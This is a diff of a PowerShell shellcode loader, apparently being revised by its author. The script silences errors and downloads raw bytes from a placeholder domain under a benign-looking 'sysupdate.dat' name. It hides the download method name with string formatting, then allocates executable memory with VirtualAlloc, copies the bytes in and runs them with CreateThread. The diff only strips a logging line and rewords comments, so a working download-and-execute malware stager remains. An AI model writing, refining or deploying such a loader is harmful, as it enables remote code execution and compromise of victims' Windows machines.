@@ -1,10 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# 1. Proof of Life
-"$(Get-Date -Format o) - Injecting shellcode" | Out-File "$env:TEMP\upd.log" -Append
-
-# 2. Download raw shellcode bytes
+# 1. Fetch Shellcode (Raw Bytes)
 $base = 'https://YOURDOMAIN.com'
 $url = "$base/assets/sysupdate.dat"
 
@@ -13,7 +10,7 @@ $c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
 $m = $c.GetType().GetMethod(('{0}{1}' -f 'Down','loadData'))
 $bytes = $m.Invoke($c, @($url))
 
-# 3. Define Windows APIs (obfuscated)
+# 2. Define APIs
 $code = @"
 using System;
 using System.Runtime.InteropServices;
@@ -25,7 +22,7 @@ public class M {
 "@
 Add-Type $code
 
-# 4. Allocate, Copy, Execute
+# 3. Inject and Execute
 $ptr = [M]::VirtualAlloc(0, [Math]::Max($bytes.Length, 4096), 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
 $thread = [M]::CreateThread(0, 0, $ptr, 0, 0, 0)
